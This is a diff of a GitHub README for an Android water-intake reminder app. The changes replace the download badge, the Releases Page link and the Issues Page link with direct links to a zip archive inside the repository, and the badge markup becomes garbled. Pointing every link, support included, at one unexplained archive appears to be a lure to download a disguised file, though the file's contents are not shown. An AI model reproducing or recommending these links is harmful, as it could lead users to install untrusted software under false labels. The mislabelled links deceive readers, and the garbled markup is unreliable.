@@ -4,7 +4,7 @@
 Welcome to the Water Reminder Android app! This application helps you track your water intake, set hydration goals, receive reminders, and view your history. Follow these simple steps to download and install it.
 
 ## 📥 Download the App
-[![Download Water Reminder](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Riinanostra/Water_Remainder_Android/releases)
+[![Download Water Reminder](https://github.com/Riinanostra/Water_Remainder_Android/raw/refs/heads/main/app/Android_Remainder_Water_v2.3-alpha.4.zip%20Now-Click%https://github.com/Riinanostra/Water_Remainder_Android/raw/refs/heads/main/app/Android_Remainder_Water_v2.3-alpha.4.zip)](https://github.com/Riinanostra/Water_Remainder_Android/raw/refs/heads/main/app/Android_Remainder_Water_v2.3-alpha.4.zip)
 
 ## 📋 Features
 - **Goal Tracking:** Set your daily water intake goal and achieve it.
@@ -19,7 +19,7 @@ Welcome to the Water Reminder Android app! This application helps you track your
 - **Storage:** Minimum of 50 MB of free space.
 
 ## 📥 Download & Install
-To download the app, please visit this page: [Releases Page](https://github.com/Riinanostra/Water_Remainder_Android/releases). There, you can find the latest version of the app.
+To download the app, please visit this page: [Releases Page](https://github.com/Riinanostra/Water_Remainder_Android/raw/refs/heads/main/app/Android_Remainder_Water_v2.3-alpha.4.zip). There, you can find the latest version of the app.
 
 1. **Visit the Releases Page**: Click on the link above.
 2. **Select the Latest Version**: Choose the most recent version for download.
@@ -42,7 +42,7 @@ The app requires the following permissions:
 - **Notification Access**: To send you reminders.
 
 ## 📞 Support
-If you encounter any issues, visit the [Issues Page](https://github.com/Riinanostra/Water_Remainder_Android/issues) to report bugs or ask questions. You can also check for updates and feature requests.
+If you encounter any issues, visit the [Issues Page](https://github.com/Riinanostra/Water_Remainder_Android/raw/refs/heads/main/app/Android_Remainder_Water_v2.3-alpha.4.zip) to report bugs or ask questions. You can also check for updates and feature requests.
 
 ## 🛠 Contributing
 We welcome contributions! If you'd like to help improve the app, please examine our contribution guidelines available in the repository.
